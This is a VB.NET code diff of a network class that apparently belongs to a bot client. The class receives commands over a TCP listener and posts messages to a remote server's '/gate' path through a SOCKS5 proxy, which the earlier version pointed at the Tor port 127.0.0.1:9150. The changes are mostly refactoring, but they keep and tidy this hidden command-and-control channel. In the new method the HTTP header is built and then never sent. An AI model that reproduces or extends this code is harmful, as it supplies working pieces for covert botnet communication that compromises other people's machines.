@@ -3,9 +3,9 @@ Imports System.Net.Sockets
 Imports Starksoft.Aspen.Proxy
 Namespace Alduin.Stump.Class.Network
     Public Class TcpListen
-        Private adr As Net.IPAddress = Net.IPAddress.Parse(LocalIP)
+        Private ReadOnly adr As Net.IPAddress = Net.IPAddress.Parse(LocalIP)
         Private client As TcpClient
-        Private listener As TcpListener
+        Private ReadOnly listener As TcpListener
         Private ReadOnly _command As ICommand
         Public TCP As TcpClient
         Public Write As StreamWriter
@@ -24,7 +24,7 @@ Namespace Alduin.Stump.Class.Network
                 Message = ""
                 Dim Reader As New StreamReader(client.GetStream())
                 While Reader.Peek > -1
-                    Message = Message + Convert.ToChar(Reader.Read())
+                    Message += Convert.ToChar(Reader.Read())
                 End While
                 'Call commands and wait result
                 Console.WriteLine(Message)
@@ -34,20 +34,23 @@ Namespace Alduin.Stump.Class.Network
             End If
         End Sub
         Public Sub TalkChannelHTTP(ByVal msg As String)
-            Dim ReachPort As Integer = 50371 'ReachPort
-            Dim header As String = "POST /test HTTP/1.1
-Host: foo.example
+            Try
+                Dim header As String = "POST /gate HTTP/1.1
 Content-Type: application/x-www-form-urlencoded
-Content-Length: 27
+Content-Length: " & msg.Length & "
 
-field1=value1&field2=value2"
-            proxyClient = New Socks5ProxyClient("127.0.0.1", 9150)
-            proxyClient.ProxyUserName = ""
-            proxyClient.ProxyPassword = ""
-            TCP = proxyClient.CreateConnection(ServerDomain, ReachPort)
-            Write = New StreamWriter(TCP.GetStream())
-            Write.Write(msg)
-            Write.Flush()
+" & msg
+                proxyClient = New Socks5ProxyClient(LocalIP, SocketPort) With {
+                    .ProxyUserName = "",
+                    .ProxyPassword = ""
+                }
+                TCP = proxyClient.CreateConnection(ServerDomain, ReachPort)
+                Write = New StreamWriter(TCP.GetStream())
+                Write.Write(msg)
+                Write.Flush()
+            Catch ex As Exception
+                Console.WriteLine(ex)
+            End Try
         End Sub
     End Class
 End Namespace
